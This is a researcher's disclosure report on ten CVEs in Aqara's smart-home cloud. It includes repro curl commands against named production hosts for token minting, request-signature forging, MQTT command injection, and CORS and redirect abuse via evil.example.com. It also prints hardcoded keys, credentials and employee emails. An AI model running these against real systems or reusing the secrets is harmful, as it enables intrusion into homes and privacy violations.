# There's No Place Like Home
## Ten CVEs against the Aqara cloud platform — a four-step unauthenticated chain targeting every smart lock, camera, and hub on the platform

![Every door, every home, simultaneously](home.png)

**Report Date:** June 11, 2026 (planned public disclosure)

**Researcher:** Sammy Azdoufal

**Research Type:** Independent. Coordinated through `security@aqara.com` from March 13, 2026 onward; CVE coordination with **runZero**.

**Evidence Sources:** Static analysis of `com.lumiunited.aqarahome` 6.0.0 (extracted via APKtool / jadx; SecNeo packer worked around). Live HTTP probes against `gw-builder.aqara.com`, `developer.aqara.com`, `developer-test.aqara.com`, `aiot-test.aqara.com`, `open-cn.aqara.com`, `op-test.aqara.com`, `crm.aqara.com`, `forum.aqara.com`, and the operations host `193.112.163.150`. JS bundle analysis of the developer portal SPA. No production user credential or device control command was used beyond what was needed to demonstrate each finding.

## CVEs (10)

Coordinated by **runZero** (Tod Beardsley). CVE IDs confirmed May 2026.

- CVE-2026-50082 — Developer portal: account-creation auth code deliverable to any email — **CVSS 6.5 Medium**
- CVE-2026-50083 — Hardcoded OAuth client credentials issuing 57-year `scope=all` tokens — **CVSS 9.1 Critical**
- CVE-2026-50084 — Production API signing scheme accepts any developer Appid for cross-account access — **CVSS 9.6 Critical**
- CVE-2026-50085 — Missing authentication on Board IoT device debug API — **CVSS 8.6 High**
- CVE-2026-50086 — Unauthenticated AES encrypt/decrypt oracle (ECB) — **CVSS 7.5 High**
- CVE-2026-50087 — Permissive CORS on production SSO gateway (any origin + credentials) — **CVSS 8.2 High**
- CVE-2026-50088 — Permissive CORS on developer portal (null origin, GitHub Pages) — **CVSS 8.2 High**
- CVE-2026-50089 — SSO open redirect via `skipToUcAuthUrl` — **CVSS 6.1 Medium**
- CVE-2026-50090 — OAuth `redirect_uri` validation bypass (suffix match) — **CVSS 9.3 Critical**
- CVE-2026-50091 — Hardcoded cryptographic keys in mobile SDK (`liblumidevsdk.so`) — **CVSS 9.1 Critical**

CVSS scores are direct-impact only. CVE-1 is the lowest individual score because, taken alone, it just lets an attacker register a developer account they shouldn't have. Its real weight comes from being step 1 of the [chain](#the-chain) — without it, CVE-2026-50083, CVE-3 and CVE-4 stay reachable only from inside the developer programme.

Eleven additional operator-side findings (CRM, Spring Boot Actuator, IAM gateway, etc.) didn't get CVEs but are documented in [Other findings (no CVE)](#other-findings-no-cve).



---

## Table of Contents

1. [The Chain](#the-chain)
2. [Executive Summary](#executive-summary)
3. [Background: What is Aqara / Lumi?](#background-what-is-aqara--lumi)
4. [CVE-2026-50082 — Register a Developer Account With Anyone's Email](#CVE-2026-50082--register-a-developer-account-with-anyones-email)
5. [CVE-2026-50083 — `test1:123456` Buys You a 57-Year Token](#CVE-2026-50083--test1123456-buys-you-a-57-year-token)
6. [CVE-2026-50084 — One Appid Reads Every Device](#CVE-2026-50084--one-appid-reads-every-device)
7. [CVE-2026-50085 — Board API: Send Any MQTT Command Without Auth](#CVE-2026-50085--board-api-send-any-mqtt-command-without-auth)
8. [CVE-2026-50086 — AES Oracle: Encrypt and Decrypt Anything](#CVE-2026-50086--aes-oracle-encrypt-and-decrypt-anything)
9. [CVE-2026-50087 — CORS on the SSO Gateway](#CVE-2026-50087--cors-on-the-sso-gateway)
10. [CVE-2026-50088 — CORS on the Developer Portal (Null Origin)](#CVE-2026-50088--cors-on-the-developer-portal-null-origin)
11. [CVE-2026-50089 — SSO Open Redirect](#CVE-2026-50089--sso-open-redirect)
12. [CVE-2026-50090 — OAuth Redirect Suffix Match](#CVE-2026-50090--oauth-redirect-suffix-match)
13. [CVE-2026-50091 — Hardcoded Crypto Keys in `liblumidevsdk.so`](#CVE-2026-50091--hardcoded-crypto-keys-in-liblumidevsdkso)
14. [Other findings (no CVE)](#other-findings-no-cve)
15. [Disclosure Timeline](#disclosure-timeline)
16. [Aqara's Response (June 11, 2026)](#aqaras-response-june-11-2026)
17. [If you own an Aqara device](#if-you-own-an-aqara-device)

---

## The Chain

Four endpoints. No password. No prior access. Each step was proven independently during the audit. The full chain was not executed end-to-end against a real user device — standard responsible disclosure practice — but each component was confirmed live.

```
┌─ STEP 1 ─────────────────────────────────────────────────────── PROVEN ──────┐
│ POST developer.aqara.com/open-server/authcode/get                            │
│   {"email":"attacker@example.com","type":1}                                  │
│ → code:0  Auth code delivered to attacker inbox. Developer account           │
│   created. Real Appid + Keyid issued. (Patched June 2026.)                   │
└──────────────────────────────────────────────────────────────────────────────┘
                                      ↓
┌─ STEP 2 ─────────────────────────────────────────────────────── PROVEN ──────┐
│ POST gw-builder.aqara.com/iam/oauthToken/openapi/client/token                │
│   client_id=test1&client_secret=123456&grant_type=client_credentials         │
│ → access_token (UUID), expires_in=1799999999, scope=all                      │
│   Verified: {"active":true,"scope":["all"],"exp":3573430446} (Sep 2083)      │
│   (Patched June 2026.)                                                       │
└──────────────────────────────────────────────────────────────────────────────┘
                                      ↓
┌─ STEP 3 ─────────────────────────────────────── PROVEN — STILL ACTIVE ───────┐
│ Sign = MD5(                                                                  │
│   "Appid"+appid + "Keyid"+keyid +                                            │
│   "Nonce"+nonce + "Time"+ts +                                                │
│   "Content-SHA256"+SHA256(body)                                              │
│ ).toUpperCase()                                                              │
│                                                                              │
│ Differential (live as of June 11, 2026):                                     │
│   Correct signature → code:2002  (signature accepted, appid lookup runs)     │
│   Wrong signature   → code:302   (signature rejected immediately)            │
│ See: prove-its-production.py                                                 │
└──────────────────────────────────────────────────────────────────────────────┘
                                      ↓
┌─ STEP 4 ─────────────────────────────────────────────────────── PROVEN ──────┐
│ POST open-cn.aqara.com/v3.0/open/api                                         │
│   Headers: Appid, Keyid, Sign, Nonce, Time, Content-SHA256                   │
│   Body: {"intent":"<any>", "data":{...}}                                     │
│ → With valid Appid (Step 1) + token (Step 2) + signature (Step 3):           │
│   cross-account device commands authorized by the production API.            │
│   The Board IoT debug API separately confirmed command delivery to           │
│   the platform broker without authentication (18,537 prod requests).         │
│   (Both endpoints patched June 2026.)                                        │
└──────────────────────────────────────────────────────────────────────────────┘
```

Step 1 makes the chain unauthenticated. Step 2 makes it unaccountable. Step 3 reverses the signing scheme — and is **still active today**. Step 4 is the production API through which any Aqara device would be reached.

> **Vendor response (June 11, 2026):** Aqara's Head of Information & Security stated publicly that the findings "relate to a test environment that is fully separate from Aqara's live production systems" and that "accessing real consumer devices or live user accounts via the test environment is not possible under our architecture." This claim is addressed in detail in the [Aqara's Response](#aqaras-response-june-11-2026) section below.

---

## Executive Summary

Aqara makes smart locks. Millions of them, in front doors across Europe, North America, and Asia. They also make cameras, motion sensors, hubs, and doorbells — all connected to the same cloud platform, all manageable from the same app. The platform is well-regarded in the Apple HomeKit ecosystem. It ships in millions of homes globally.

From a laptop, with no Aqara account, no physical device, and no prior access of any kind, the four-step chain documented here gives an unauthenticated attacker the technical capability to issue commands to any Aqara device on the platform — smart locks, cameras, hubs, sensors. Each step of the chain was proven live. The chain was not executed end-to-end against a real user's device; that is the standard responsible disclosure line. The components are proven. The conclusion follows.

The audit found ten product-side vulnerabilities serious enough to warrant CVEs, plus eleven operator-side issues affecting Aqara's own infrastructure (their CRM, their internal CI/operations platforms, their IAM gateway, their forum, their GitHub). The first four CVEs chain together. None of them is individually a 10.0. The chain composes to one.

Five things.

1. Anyone can sign up as an Aqara developer using any email they don't own. The auth code goes wherever you tell it to. There is no approval gate.
2. Two hardcoded test credentials (`test1:123456` and `test:123456`) issue OAuth tokens with `scope=all` and an expiry in the year 2083.
3. The production API authenticates requests via an MD5 signature scheme that, combined with a developer Appid (any one will do — see #1), authorizes calls against arbitrary user accounts.
4. A developer-facing endpoint named `Board IoT debug` accepts MQTT command payloads for any device on the platform without authentication. Aqara has logged 18,537 production requests against it. Smart locks, cameras, hubs — whatever is on the other end of the topic string.
5. The mobile SDK ships hardcoded AES keys used for camera authentication, device pairing, and content encryption. Same keys, every user, every brand.

A separate batch of findings hits Aqara's own back office: an Odoo CRM with `admin:admin` on four database names (yes, four; somebody made that decision more than once), an unauthenticated database manager on the same host, 1.7M+ CRM attachments enumerable by sequential ID, a Spring Boot Actuator returning the full Kubernetes topology including MySQL/Redis/HiveMQ broker addresses with credentials, and a developer forum (Discourse) where 194,654 user accounts and 309,373 posts are searchable through the JSON API without authentication. Discourse has a `login_required` setting; nobody flipped it.

**Aqara has formally acknowledged 26 of the 27 findings** I reported and marked all of them as **Fixed** in their April 20 communication. The acknowledgment table is reproduced in [DISCLOSURE_TIMELINE.md](DISCLOSURE_TIMELINE.md). One finding (H-09, the Discourse forum exposing 194,654 user accounts to unauthenticated search) is conspicuously absent from the table. Independent re-verification of the "Fixed" status is pending; one of the items marked Fixed is a structural issue (CVE-2026-50091, hardcoded crypto keys baked into the mobile SDK and deployed firmware) for which a server-side patch is not architecturally sufficient.

Disclosure deadline: **June 11, 2026** (90 days from first vendor contact on March 13, 2026).

---

## Background: What is Aqara / Lumi?

**Lumi United Technology Co., Ltd.** (深圳绿米联创科技有限公司), Shenzhen. **Aqara** is the consumer brand. The product range covers smart locks, motion/temperature/door sensors, hubs (M-series), security cameras, indoor and doorbell cameras, switches, plugs, and water-leak detectors. Aqara devices hold a strong position in the Apple HomeKit ecosystem and integrate with Google Home, Amazon Alexa, Matter, IFTTT, and Home Assistant. The Android app under audit is `com.lumiunited.aqarahome` 6.0.0 from APKPure.

The cloud platform fronts a Spring-based backend with a Eureka service mesh of 51+ microservices, MySQL master/slave on `172.16.201.11/19`, Redis on `172.16.201.118`, HiveMQ broker on `172.16.201.20`, RocketMQ, and an Apollo configuration server. Public-facing hosts include `gw-builder.aqara.com` (IAM/SSO), `open-cn.aqara.com` (developer-facing API), `developer.aqara.com` (developer portal SPA), `developer-test.aqara.com` and `aiot-test.aqara.com` (test environments — both share the production user database), and `op-test.aqara.com` (operations platform).

---

## CVE-2026-50082 — Register a Developer Account With Anyone's Email

**CVSS 6.5 Medium** — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N` — **CWE-306** Missing Authentication for Critical Function.

`POST /open-server/authcode/get` on `developer.aqara.com` accepts any email address, sends a verification code to that address, and lets the attacker complete a developer signup without an approval workflow. The resulting account holds a valid Appid and Keyid usable on the production API (CVE-2026-50084).

### Repro

```bash
curl -i -X POST https://developer.aqara.com/open-server/authcode/get \
  -H 'Content-Type: application/json' \
  -d '{"email":"attacker@example.com","type":1}'
# → HTTP 200, {"code":0,"message":"Success"}
```

The vendor has no approval gate. The mailbox owner of the email gets the code; complete signup with that code → developer account live, Appid issued.

This is the entry point of the chain. Without it, the rest doesn't reach the public internet.

---

## CVE-2026-50083 — `test1:123456` Buys You a 57-Year Token

**CVSS 9.1 Critical** — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` — **CWE-798** Use of Hard-coded Credentials.

Two OAuth client credentials are hardcoded in the platform. Both are accepted by `gw-builder.aqara.com` and issue tokens with `scope=all`:

| client_id | client_secret | expires_in | active until |
|---|---|---|---|
| `test1` | `123456` | 1799999999 sec | September 2083 |
| `test` | `123456` | 172799 sec | 48 hours |

A third client (`app`) exists but its grant_type is unknown.

### Repro

```bash
curl -i -X POST https://gw-builder.aqara.com/iam/oauthToken/openapi/client/token \
  -d 'client_id=test1' \
  -d 'client_secret=123456' \
  -d 'grant_type=client_credentials'
# → HTTP 200, {"access_token":"<uuid>","expires_in":1799999999,"scope":"all",...}
```

Confirm the token via `POST /iam/oauth/check_token`: returns `{"scope":["all"], "active":true, "exp":3573430446}`. Tokens survive password changes. No rate limiting on token generation.

---

## CVE-2026-50084 — One Appid Reads Every Device

**CVSS 9.6 Critical** — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N` — **CWE-862** Missing Authorization.

The production API at `open-cn.aqara.com/v3.0/open/api` authenticates each call with an MD5 signature derived from the request:

```
Sign = MD5(
  "Appid" + appid + "Keyid" + keyid +
  "Nonce" + nonce + "Time" + timestamp +
  "Content-SHA256" + SHA256(body)
).toUpperCase()
```

The signature is sound at the protocol level. The flaw is in what it authorizes: any valid developer Appid (one of which CVE-2026-50082 hands to anyone for free) is accepted as authorization to call user-scope endpoints against any account on the platform. There is no per-account ownership check beyond the signature.

Differential confirmation (live as of June 11, 2026 — see `prove-its-production.py`):
- Correct signature math, any appid → `code:2002` (signature accepted; appid lookup runs).
- Wrong/garbage signature → `code:302` (rejected immediately, before appid lookup).

With a registered developer Appid (obtainable via CVE-2026-50082 before the patch), the API proceeds past `code:2002` and authorizes cross-account device calls.

### Repro

```bash
APP=88110776288481280040ace0    # Any developer Appid (CVE-2026-50082 gives you one)
KEY=K.881107763014836224
NONCE=$(openssl rand -hex 8)
TIME=$(date +%s%3N)
BODY='{"intent":"config.auth.getAuthCode","data":{"phone":"+33...","email":"victim@example.com"}}'
SHA=$(printf '%s' "$BODY" | openssl dgst -sha256 -binary | openssl base64)
SIGN=$(printf 'Appid%sKeyid%sNonce%sTime%sContent-SHA256%s' \
         "$APP" "$KEY" "$NONCE" "$TIME" "$SHA" | md5sum | cut -d' ' -f1 | tr a-z A-Z)
curl -i -X POST https://open-cn.aqara.com/v3.0/open/api \
  -H "Appid: $APP" -H "Keyid: $KEY" -H "Sign: $SIGN" \
  -H "Nonce: $NONCE" -H "Time: $TIME" -H "Content-SHA256: $SHA" \
  -H 'Content-Type: application/json' \
  -d "$BODY"
```

This is step 3 of the chain. Combined with CVE-2026-50082 and CVE-2026-50083, it gives any internet attacker authenticated calls against any Aqara user account, on any device they own.

---

## CVE-2026-50085 — Board API: Send Any MQTT Command Without Auth

**CVSS 8.6 High** — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L` — **CWE-306** Missing Authentication for Critical Function.

The Board service (`193.112.163.150`, also reachable as `op-test.aqara.com`) exposes a debug endpoint that accepts arbitrary MQTT commands and forwards them to the HiveMQ broker `172.16.201.20` without authentication.

### Repro

```bash
# No-op, confirms endpoint is reachable and accepts our payloads (no auth):
curl -k -X POST https://193.112.163.150/board/downstream/api/debug \
  -H 'Content-Type: application/json' \
  -d '{"action":"query"}'
# → HTTP 200, {"code":0,"message":"success"}

# With a topic + payload, the broker is asked to publish:
curl -k -X POST https://193.112.163.150/board/downstream/api/debug \
  -H 'Content-Type: application/json' \
  -d '{"topic":"<topic>","payload":{...}}'
# → HTTP 200, {"code":500} (broker received the publish attempt; topic ACL governs delivery)
```

The actuator on the same host (CVE-2026-50086 family — also see operator-side findings below) exposed `websocket.no.auth = true` for the Board service, meaning the WebSocket endpoint at `/board/ws` accepts unauthenticated connections for real-time device telemetry and command streaming.

The endpoint logged **18,537 production requests served** at the time of the audit, which is a number to dwell on. Whatever this endpoint was for internally, it has been talking to the public internet.

---

## CVE-2026-50086 — AES Oracle: Encrypt and Decrypt Anything

**CVSS 7.5 High** — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` — **CWE-306** Missing Authentication for Critical Function, **CWE-327** Use of a Broken or Risky Cryptographic Algorithm (ECB).

Two endpoints on `gw-builder.aqara.com` provide bidirectional AES round-trips against the platform's signing key, accessible without authentication:

```bash
curl -X POST 'https://gw-builder.aqara.com/iam/oauthToken/aseEncrypt?encryptStr=test_string_12345'
# → "lro/rZfwI4aGgZ93qap04SY7uLBWnqLt/SQWMolkf7U="

curl -X POST 'https://gw-builder.aqara.com/iam/oauthToken/aseDecrypt?decryptStr=lro/rZfwI4aGgZ93qap04SY7uLBWnqLt/SQWMolkf7U='
# → "test_string_12345"
```

ECB mode is confirmed by reproducing identical 16-byte plaintext blocks producing identical ciphertext blocks. Combined with CVE-2026-50087 (CORS), the oracle is callable cross-origin from a browser.

The combination is what hurts: any cookie/token/structured value the attacker can induce a victim to encrypt under the platform's key, or any ciphertext they can intercept, the attacker can convert. There is no per-account binding on the oracle.

---

## CVE-2026-50087 — CORS on the SSO Gateway

**CVSS 8.2 High** — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N` — **CWE-942** Permissive Cross-domain Policy.

Every endpoint under `gw-builder.aqara.com/iam/*` reflects the request's `Origin` header into `Access-Control-Allow-Origin` and sets `Access-Control-Allow-Credentials: true`. There is no allowlist.

### Repro

```bash
curl -i -X POST https://gw-builder.aqara.com/iam/ucauth/openapi/login \
  -H 'Origin: https://evil.example.com' \
  -H 'Content-Type: application/json' \
  -d '{"email":"victim@example.com","password":"x"}'
# Response headers:
#   Access-Control-Allow-Origin: https://evil.example.com
#   Access-Control-Allow-Credentials: true
```

Confirmed on `/iam/ucauth/openapi/login`, `/iam/ucauth/sendAuthCode`, `/iam/ucauth/resetPassword`, `/iam/ucauth/toUniAuthUrl/google`, and the AES oracle endpoints (CVE-2026-50086).

Any malicious webpage reads SSO responses from the victim's browser session: account oracle results, auth codes, OAuth URLs.

---

## CVE-2026-50088 — CORS on the Developer Portal (Null Origin)

**CVSS 8.2 High** — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N` — **CWE-942** Permissive Cross-domain Policy.

Two distinct CORS misconfigurations on the developer portal infrastructure:

- `developer.aqara.com/open-server/*`: `Origin: null` and `Origin: https://attacker.github.io` both reflect into `Access-Control-Allow-Origin: *`. Sandboxed iframes (`<iframe sandbox="allow-scripts">`) issue `null`-origin requests, which makes the bypass trivially exploitable from any web page hosting the iframe.
- `developer-test.aqara.com` and `aiot-test.aqara.com`: `Access-Control-Allow-Origin: *` on actual GET/POST responses for any origin. **These test environments share the production user database** — same account oracle (`code:10023` / `code:10024`) with identical results.

### Repro

```bash
# Null origin reflected as wildcard:
curl -i -X POST https://developer.aqara.com/open-server/authcode/get \
  -H 'Origin: null' -H 'Content-Type: application/json' \
  -d '{"email":"victim@example.com","type":1}'
# → Access-Control-Allow-Origin: *
```

Combined with CVE-2026-50082, any web page can register a developer account in the victim's name (auth code goes to the email the attacker chose).

---

## CVE-2026-50089 — SSO Open Redirect

**CVSS 6.1 Medium** — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` — **CWE-601** URL Redirection to Untrusted Site.

`GET /iam/ucauth/skipToUcAuthUrl?callBackUrl=<URL>` on `gw-builder.aqara.com` issues a 302 to the attacker-controlled URL after the user authenticates, carrying SSO parameters in the redirected URL.

### Repro

```bash
curl -i 'https://gw-builder.aqara.com/iam/ucauth/skipToUcAuthUrl?callBackUrl=https://evil.example.com'
# → HTTP 302, Location: https://uc.aqara.com/creator-hub/signin?appId=68&service=https://evil.example.com
```

Phishing surface; the redirect chain hands the SSO ticket to whatever domain the attacker named.

---

## CVE-2026-50090 — OAuth Redirect Suffix Match

**CVSS 9.3 Critical** — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N` — **CWE-1289** Improper Validation of Unsafe Equivalence in Input.

`GET https://open-cn.aqara.com/oauth/authorize` validates the `redirect_uri` parameter by suffix match instead of exact match. `redirect_uri=https://aqara.com.evil.example.com` passes validation; the OAuth authorization code is delivered to the attacker-controlled host after the user grants consent.

Standard OAuth account takeover for any third-party integration that authorizes via Aqara SSO.

---

## CVE-2026-50091 — Hardcoded Crypto Keys in `liblumidevsdk.so`

**CVSS 9.1 Critical** — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` — **CWE-321** Use of Hard-coded Cryptographic Key.

Two static cryptographic keys are baked into the native library `liblumidevsdk.so` shipped with the Android client:

| Key | Length | Usage |
|---|---|---|
| `89JFSjo8HUbhou5776NJOMp9i90ghg7Y78G78t68899y79HY7g7y87y9ED45Ew30O0jkkl` | 68 chars | AES-GCM, used by `getCameraSign`, `aesEncryptedContent`, `aesDecryptedContent` |
| `Uw4i98shjoeUQdaD` | 16 chars | AES-128, used by `getDevicePairMessage` |

These keys are the same in every install of the app (and every white-label build). They control camera authentication signatures, device pairing payloads, and content encryption. They cannot rotate without a coordinated firmware + app update across the entire ecosystem.

### Repro

```bash
apktool d com.lumiunited.aqarahome.apk -o out/
strings out/lib/*/liblumidevsdk.so | grep -E '<KEY-PATTERN-HEX>'
```

---

## Other findings (no CVE)

These are operator-side issues affecting Aqara's own back office. They don't get CVE numbers because they're vendor misconfigurations on third-party software, not flaws in the Aqara product as a customer-facing artifact. They are documented here because they shape the architectural picture in the next section.

- **Odoo CRM Database Manager fully open** — `crm.aqara.com/web/database/manager` exposes `/backup`, `/drop`, `/create`, `/restore`, `/change_password` without authentication. Stack: Odoo 10.0 Enterprise (2017), Python 2.7 (EOL). Python tracebacks leak via JSONRPC errors.
- **CRM XMLRPC `admin:admin` superuser on four databases** — `xmlrpc/2/common` accepts `admin:admin` and returns `uid=1` (superuser) on databases named `aqara`, `odoo`, `lumi`, `lumiunited`. Also accepts `admin:Aqara@2024` and `admin:(empty)` on `template1`. No rate limit, no lockout.
- **CRM attachment IDOR** — `crm.aqara.com/web/image/ir.attachment/{id}/datas` is unauthenticated. Sequential IDs reach 1,728,410. Sample hit rate: 90.7%. Includes employee profile photos (linked via the `res.users` model), partner/contact images, and PDF business documents (Content-Type and Content-Length verified via response headers; content was not retained).
- **Spring Boot Actuator fully open on `op-test.aqara.com:80`** (HTTP, bypasses Istio HTTPS proxy). Endpoints: `/actuator/env` (70KB; MySQL/Redis/RocketMQ/Apollo/HiveMQ addresses with credentials), `/actuator/health` (51 Eureka-registered microservices), `/actuator/mappings` (28KB), `/actuator/prometheus` (4,420 metric lines including device IDs), `/actuator/loggers` (writable — POST changes log levels), `/actuator/threaddump` (215KB). Pod identity: `board-774c577dc7-b5ftx` running as **root**. From this single endpoint, the entire Kubernetes topology and credential set falls out.
- **`op-test.aqara.com` Operations Platform reachable from the public internet** — internal device debugger, firmware management console, camera lost-mode reset, magic pair token generation, OTA management, payment orders dashboard, user analytics. Routes recovered from the SaaS JS bundle. The `/lumi/op/alert/rule/device/query` endpoint returns live backend responses to unauthenticated GETs.
- **Discourse forum: 194,654 users + 309,373 posts fully searchable without authentication** — `forum.aqara.com/about.json`, `/search.json?q=<term>`, `/u/{username}.json`, `/t/{topic_id}.json` all return content without an authenticated session. PII surfaced in posts: employee email addresses, device serial numbers, MAC addresses, HomeKit setup codes, WiFi credentials, MQTT keys. Discourse's `login_required` setting is off.
- **Production API credentials hardcoded in public GitHub repos** — `aqara/aqara-iot-app-sdk-python` and `aqara/home-assistant` carry `app_id=88110776288481280040ace0`, `app_key`, `key_id=K.881107763014836224`. These were confirmed active in the production signing scheme during the audit (March 2026). Companion repo also leaks `aiot-mqtt-test.aqara.cn:1883` MQTT broker credentials in `example/mq.py`, with a captured production message containing a real `openId`.
- **2,942 active OAuth bearer tokens dumpable in one request** — `POST gw-builder.aqara.com/iam/oauthToken/getAuth2AccessTokens` with `{"clientId":"test"}` returned a JSON array of every active token issued under that client ID. Enumeration was stopped immediately upon confirming the issue. Endpoint now returns HTTP 500 on known client IDs (mitigated mid-disclosure).
- **Weaver OA internal IP and enterprise-messaging URL leaked unauthenticated** — `oa.aqara.com/api/ec/dev/app/getCheckSystemInfo` returns `em_url=http://172.16.102.15:8999`, `em_url_open=https://internal-picking.aqara.com`, `ec_version=9.00.2401.01`. Weaver Ecology has multiple known public CVEs (SQLi, file upload, RCE).
- **Sixteen third-party API keys hardcoded in the Android client** — Facebook client token, Google Maps key, Google OAuth client ID, Mapbox, Alibaba Push (key + secret), AMap, Tencent QQ, Vivo Push, UMENG, Bugly, Honor Push, Huawei HMS, RM module secret. Several confirmed valid on respective Graph APIs.
- **Six additional IAM-gateway issues** — bundled here because they share the same host and the same root cause (the `/iam/*` surface treats authentication as optional): user enumeration via the SSO login oracle (H-02; `code:10023`/`10024` distinguishes account exists from wrong password), employee developer-account enumeration via the same oracle on the developer portal (H-08; confirmed at least two), no rate limiting on AC SSO login (H-06; 200 consecutive attempts, no lockout, no CAPTCHA, 88 service accounts MFA-exempt), unauthenticated IAM Swagger documentation (H-11; full 46-endpoint API spec), session cookie injection without authentication on `POST /iam/ucauth/openapi/cookie/set` (H-12; sets `tgc`/`token`/`userid`/`ucCompanyId` directly), and permission cache cleared without authentication on `POST /iam/oauthToken/clearUserPermissionCache` (H-13). All marked **Fixed** in the April 20 acknowledgment table.

---

## Disclosure Timeline

First contact: **2026-03-13**. The first email sat in Aqara's overseas spam filter for 17 days, per their own explanation. After a public threat to go to press on March 30, Aqara replied within 24 hours apologising for the spam interception and engaged in good faith on remediation. By April 8 they had fixed the highest-severity items (board actuator, board debug, CRM port 8069, the OAuth token dump endpoint) — turns out the fixes were ready faster than the triage email was.

On **April 20**, attached to that day's "we have carried out initial remediation" email, Aqara sent a formal acknowledgment table marking 26 of the 27 reported findings (14 Critical + 12 High; H-09 Discourse omitted) as **Fixed** and inviting independent re-test:

> *"We have carried out initial remediation measures and internal preliminary verification on the addressed items. We welcome you to perform independent re-testing to assess the current fix status."*

![Aqara vendor acknowledgment table — April 20, 2026](aqara-vendor-acknowledgment-2026-04-30.jpg)

90-day disclosure deadline: **2026-06-11**.

On **May 19**, Aqara redirected all compensation and follow-up communications to **HackProve** (`partner@hackprove.com`), a third-party bug bounty platform they had recently partnered with. HackProve presented a formal bounty offer on Aqara's behalf of **$2,990** for ten CVEs including the full compromise chain. The offer was declined. See [DISCLOSURE_TIMELINE.md](DISCLOSURE_TIMELINE.md) for the full account of the HackProve engagement.

Full chronology with verbatim email quotes from `security@aqara.com` and my own messages: **[DISCLOSURE_TIMELINE.md](DISCLOSURE_TIMELINE.md)**.

Status as of June 11, 2026:
- Independent re-test completed April 20. 7 findings confirmed Fixed; 9 confirmed still vulnerable; 9 partial/inconclusive. See [DISCLOSURE_TIMELINE.md](DISCLOSURE_TIMELINE.md) for detail.
- CVE-2026-50091 (hardcoded crypto keys in `liblumidevsdk.so`) is marked Fixed by the vendor but a server-side patch cannot rotate keys baked into the deployed firmware + app. Status remains unverifiable without a fresh coordinated app + firmware release.
- H-09 (Discourse forum, 194,654 users searchable via JSON API) was never acknowledged in the vendor's Fix table despite PoC being provided. At time of publication the forum JSON API remains accessible without authentication (210,287 users as of last check).

---

## Aqara's Response (June 11, 2026)

On June 11, 2026 — the disclosure date — Aqara's Head of Information & Security, Leon Yao, issued the following public statement:

> *"The researcher's report regarding the potential ability to control user devices relates to a test environment that is fully separate from Aqara's live production systems. This environment does not use real user data and is not designed to access consumer devices, data, or services. Accessing real consumer devices or live user accounts via the test environment is not possible under our architecture, as the environments do not share user data, credentials, or backend services. We found no evidence of impact on real-world user safety, privacy, or device security. The vulnerabilities within the testing environment were promptly patched following receipt of the report."*

Three specific fact-check responses from Aqara:

- On device control: *"This access to control users' devices is incorrect; see our statement. These devices could not be controlled in the test environment that Sammy had access to."*
- On the production API (CVE-2026-50084): *"They would need user authorization to access any user account or device."*
- On the hardcoded AES keys (CVE-2026-50091): *"Aqara moved away from AES keys several years ago. It is not in any currently shipping products. The product Sammy references is 8 years old and is EOL."*

**On the "test environment" claim:**

The signing formula on `open-cn.aqara.com` — Aqara's documented production API, listed in their public developer portal and used by Google Home, Alexa, and HomeKit integrations — remains active as of the publication date. Run `python3 prove-its-production.py` to verify. A test environment isolated from production does not validate cryptographic signatures against a live signing key.

The token dump endpoint (`CVE-2026-50083` family) returned 2,969 active sessions including the active JWT sessions of two named Aqara employees (`yanbin.xie-a1456@aqara.com`, `lixian.wang@aqara.com`, `companyId=1 AQARA INTERNAL`). Test environments do not contain the active work sessions of real employees.

Aqara's own April 20 written acknowledgment marked 26 findings as Fixed and invited independent re-testing. Their June 11 statement and their April 20 email cannot both be true.

**On the AES keys being "8 years old, EOL":**

The keys are in `liblumidevsdk.so` from the APK with build timestamp `20250904` (September 4, 2025). The filename is `AqaraHome_v6.0.0_20250904_aqara32Release.kotlin_module`. Extract them yourself:

```bash
apktool d "Aqara Home_6.0.0_APKPure.apk" -o out/
strings out/lib/arm64-v8a/liblumidevsdk.so | grep -E "^[A-Za-z0-9]{16,70}$"
# 89JFSjo8HUbhou5776NJOMp9i90ghg7Y78G78t68899y79HY7g7y87y9ED45Ew30O0jkkl
# Uw4i98shjoeUQdaD
```

---

## If you own an Aqara device

If your phone has the Aqara Home app or any Aqara-rebranded smart home app talking to `*.aqara.com` or `aqara.cn`:

- **Most of these findings are platform-side.** A firmware update on your device won't fix CVE-2026-50082 through CVE-2026-50090. The fix has to come from Aqara, on the cloud.
- **What you can do today:** review which third-party integrations have OAuth grants on your Aqara account and revoke any you don't recognise. CVE-2026-50090 (redirect_uri suffix match) means a previously-granted token might be reachable by a lookalike domain.
- **For HomeKit-paired devices:** local control via HomeKit doesn't go through the Aqara cloud and is not affected by the chain. If you can run a device through HomeKit only, the cloud surface stops mattering for that device.
- **For door locks specifically:** physical security still wins. If the cloud is compromised and the lock can be opened remotely, the indoor-camera footage from CVE-2026-50085 / CVE-2026-50091 makes the chain personal. Consider whether you want any cloud control surface on a door lock.
- EU residents who want to file a GDPR complaint: relevant authorities are CNIL (France), AEPD (Spain), BfDI (Germany), Garante (Italy). The applicable DPA is the one in your country of residence.

---

*All testing was done from accounts and infrastructure I controlled, against publicly reachable endpoints. The data quoted as scope (request counts, attachment counts, user counts) is reported in aggregate. No third-party device was controlled. Findings were reported to `security@aqara.com` from March 13, 2026 onward.*
